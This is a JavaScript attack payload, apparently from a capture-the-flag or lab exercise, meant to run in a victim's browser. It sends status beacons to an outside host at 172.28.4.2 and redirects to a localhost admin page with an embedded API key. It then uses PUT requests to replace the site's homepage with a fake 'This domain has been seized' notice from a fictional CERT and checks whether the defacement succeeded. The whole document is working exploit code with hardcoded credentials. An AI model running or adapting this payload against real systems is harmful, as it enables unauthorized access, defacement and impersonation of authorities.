(async () => {
  const T = "VTG924";
  const K = "vk_live_daf5f1744a7bfbbeefe31e1544ca1d4ee214";
  const ITK = "itk_b906dd15dd9c93fa4cf16108c82c3005ac95185f4f7559f8794d88cfc310c84a";

  // DB beacon: POST to /tip.php → creates a tip record readable via SQLi
  // Clean — not cache-based, not contaminated by our monitoring
  const bc = async (key) => {
    const title = (T + '_' + key).substring(0, 50).replace(/[^a-zA-Z0-9_.]/g, '_');
    const fd = new FormData();
    fd.append('title', title);
    fd.append('body', 'beacon');
    fd.append('link', 'https://beacon.test');
    fd.append('intake', ITK);
    try {
      await fetch('http://172.28.4.2/tip.php', {
        method: 'POST',
        body: fd,
        mode: 'no-cors'
      });
    } catch(e) {}
  };

  await bc('A');

  const host = window.location.hostname;
  const tipId = new URLSearchParams(window.location.search).get('id') || '0';
  await bc('H_' + host.replace(/\./g, '_').substring(0, 15));

  if (host !== '127.0.0.1') {
    await bc('REDIR');
    window.location.href = 'http://127.0.0.1/admin/review.php?id=' + tipId + '&api_key=' + K;
    return;
  }

  // Phase 2: running at 127.0.0.1 — PUT here gets REMOTE_ADDR=127.0.0.1
  await bc('P2_START');

  const SEIZED = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Seized — CERT-Tervalis</title>
<!-- CT-CASE -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap">
<style>
  :root{--paper:#f4f3ef;--ink:#191713;--muted:#6a6558;--line:#cfcabb;--seal:#171410;--red:#8f2f22;
    --sans:"Hanken Grotesk",-apple-system,system-ui,Segoe UI,Roboto,Arial,sans-serif;
    --mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace}
  *{box-sizing:border-box;margin:0}
  body{background:var(--paper);color:var(--ink);font-family:var(--sans);line-height:1.6;min-height:100vh;
    display:flex;align-items:center;justify-content:center;padding:40px}
  .notice{max-width:660px;width:100%;text-align:center;border:1px solid var(--ink);
    box-shadow:0 0 0 5px var(--paper),0 0 0 6px var(--ink);padding:52px 48px 44px}
  .seal{margin:0 auto 26px;display:block}
  .seal text{font-family:var(--mono);fill:var(--seal)}
  h1{font-weight:800;letter-spacing:.01em;text-transform:uppercase;font-size:clamp(28px,4.6vw,42px);line-height:1.06}
  .rule{width:64px;height:3px;background:var(--red);margin:22px auto 24px}
  .lead{max-width:52ch;margin:0 auto;font-size:17px;color:#2c2a24}
  .lead b{font-weight:700}
  .legal{max-width:52ch;margin:24px auto 0;font-size:13.5px;color:var(--muted)}
  .by{font-family:var(--mono);font-size:12px;letter-spacing:.16em;text-transform:uppercase;color:var(--ink);
    margin-top:34px;padding-top:22px;border-top:1px solid var(--line)}
  .by b{color:var(--red)}
</style>
</head>
<body>
  <main class="notice">
    <svg class="seal" width="132" height="132" viewBox="0 0 200 200" aria-label="CERT-Tervalis seal">
      <defs>
        <path id="top" d="M 30 100 A 70 70 0 0 1 170 100"/>
        <path id="bot" d="M 30 100 A 70 70 0 0 0 170 100"/>
      </defs>
      <circle cx="100" cy="100" r="94" fill="none" stroke="#171410" stroke-width="2"/>
      <circle cx="100" cy="100" r="84" fill="none" stroke="#171410" stroke-width="1"/>
      <circle cx="100" cy="100" r="52" fill="none" stroke="#171410" stroke-width="1.5"/>
      <text font-size="10.2" letter-spacing="1.5" text-anchor="middle"><textPath href="#top" startOffset="50%">COMPUTER EMERGENCY RESPONSE</textPath></text>
      <text font-size="12.5" letter-spacing="4" text-anchor="middle"><textPath href="#bot" startOffset="50%">&#9733;  TERVALIS  &#9733;</textPath></text>
      <g stroke="#171410" stroke-width="3.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="100" cy="74" r="5.5"/>
        <line x1="100" y1="80" x2="100" y2="126"/>
        <line x1="85" y1="94" x2="115" y2="94"/>
        <path d="M 76 110 A 24 24 0 0 0 124 110"/>
        <line x1="76" y1="110" x2="70" y2="104"/><line x1="76" y1="110" x2="82" y2="106"/>
        <line x1="124" y1="110" x2="130" y2="104"/><line x1="124" y1="110" x2="118" y2="106"/>
      </g>
    </svg>
    <h1>This domain has<br>been seized</h1>
    <div class="rule"></div>
    <p class="lead">This domain and its associated services have been <b>seized by CERT-Tervalis</b> — the
    Computer Emergency Response Team of Tervalis — and are no longer in service.</p>
    <p class="legal">Unauthorized access to this system is prohibited and may be subject to investigation and
    prosecution under the laws of Tervalis.</p>
    <div class="by">By order of <b>CERT-Tervalis</b> · Cyber Division</div>
  </main>
</body>
</html>`;

  // Try JSON-wrapped PUT
  let jsonStatus = 'ERR';
  let jsonHasCT = false;
  try {
    const r = await fetch('/api/pages/home?api_key=' + K, {
      method: 'PUT',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({body: SEIZED})
    });
    jsonStatus = String(r.status);
    const t = await r.text();
    jsonHasCT = t.includes('CT-CASE');
    await bc('JSON_' + jsonStatus + (jsonHasCT ? '_CT' : '_NO'));
  } catch(e) {
    await bc('JSON_ERR');
  }

  // Try raw HTML PUT
  let rawStatus = 'ERR';
  let rawHasCT = false;
  try {
    const r2 = await fetch('/api/pages/home?api_key=' + K, {
      method: 'PUT',
      headers: {'Content-Type': 'text/html; charset=utf-8'},
      body: SEIZED
    });
    rawStatus = String(r2.status);
    const t2 = await r2.text();
    rawHasCT = t2.includes('CT-CASE');
    await bc('RAW_' + rawStatus + (rawHasCT ? '_CT' : '_NO'));
  } catch(e) {
    await bc('RAW_ERR');
  }

  // Check homepage
  try {
    const hr = await fetch('/?t=' + Date.now(), {cache: 'no-store'});
    const ht = await hr.text();
    await bc(ht.includes('CT-CASE') ? 'WIN' : 'FAIL_' + ht.length);
  } catch(e) {
    await bc('CHKERR');
  }
})();
